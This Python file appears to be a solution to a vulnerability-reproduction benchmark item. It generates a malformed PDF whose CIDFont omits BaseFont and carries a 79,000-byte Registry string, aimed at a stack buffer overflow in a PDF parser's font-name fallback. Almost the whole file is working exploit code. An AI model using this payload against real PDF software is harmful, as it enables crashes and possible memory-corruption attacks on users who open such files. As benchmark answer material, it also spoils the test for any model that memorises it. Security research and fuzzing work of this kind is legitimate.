import sys

class Solution:
    def solve(self, src_path: str) -> bytes:
        # The vulnerability is a Stack Buffer Overflow in the CIDFont fallback mechanism.
        # Specifically, when the BaseFont is missing, the code constructs a name using 
        # "<Registry>-<Ordering>". If Registry or Ordering strings are too long, they 
        # overflow a fixed-size stack buffer (likely 256 or 512 bytes).
        
        # Ground-truth PoC length is 80064 bytes. We will target a similar size.
        payload_len = 79000
        payload = b"A" * payload_len
        
        # Construct the PDF parts
        header = b"%PDF-1.4\n"
        
        # Object 1: Catalog
        o1 = b"1 0 obj\n<< /Type /Catalog /Pages 2 0 R >>\nendobj\n"
        
        # Object 2: Pages
        o2 = b"2 0 obj\n<< /Type /Pages /Kids [3 0 R] /Count 1 >>\nendobj\n"
        
        # Object 3: Page (Referencing the Resources)
        o3 = b"3 0 obj\n<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] /Resources 4 0 R /Contents 5 0 R >>\nendobj\n"
        
        # Object 4: Resources (Referencing the Font)
        o4 = b"4 0 obj\n<< /Font << /F1 6 0 R >> >>\nendobj\n"
        
        # Object 5: Content Stream (Using the Font)
        # We must use the font to ensure it gets parsed.
        o5 = b"5 0 obj\n<< /Length 20 >>\nstream\nBT /F1 12 Tf (A) Tj ET\nendstream\nendobj\n"
        
        # Object 6: Type0 Font (Referencing the CIDFont)
        o6 = b"6 0 obj\n<< /Type /Font /Subtype /Type0 /BaseFont /MyFont /Encoding /Identity-H /DescendantFonts [7 0 R] >>\nendobj\n"
        
        # Object 7: CIDFont (The Vulnerable Object)
        # We omit /BaseFont to trigger the fallback logic.
        # We provide /CIDSystemInfo with a huge Registry string.
        cid_info = b"<< /Registry (" + payload + b") /Ordering (Identity) /Supplement 0 >>"
        o7 = b"7 0 obj\n<< /Type /Font /Subtype /CIDFontType2 /CIDSystemInfo " + cid_info + b" /FontDescriptor 8 0 R >>\nendobj\n"
        
        # Object 8: FontDescriptor (Required by CIDFontType2)
        o8 = b"8 0 obj\n<< /Type /FontDescriptor /FontName /MyFont /Flags 4 /FontBBox [0 0 1000 1000] /ItalicAngle 0 /Ascent 1000 /Descent -200 /CapHeight 1000 /StemV 80 >>\nendobj\n"
        
        objects = [o1, o2, o3, o4, o5, o6, o7, o8]
        
        # Build the body and calculate offsets
        body = b""
        offsets = []
        current_offset = len(header)
        
        for obj in objects:
            offsets.append(current_offset)
            body += obj
            current_offset += len(obj)
            
        # XRef Table
        # 0 to 8 = 9 entries
        xref = b"xref\n0 9\n0000000000 65535 f \n"
        for off in offsets:
            xref += b"%010d 00000 n \n" % off
            
        # Trailer
        trailer = b"trailer\n<< /Size 9 /Root 1 0 R >>\n"
        startxref = b"startxref\n%d\n" % current_offset
        eof = b"%%EOF"
        
        return header + body + xref + trailer + startxref + eof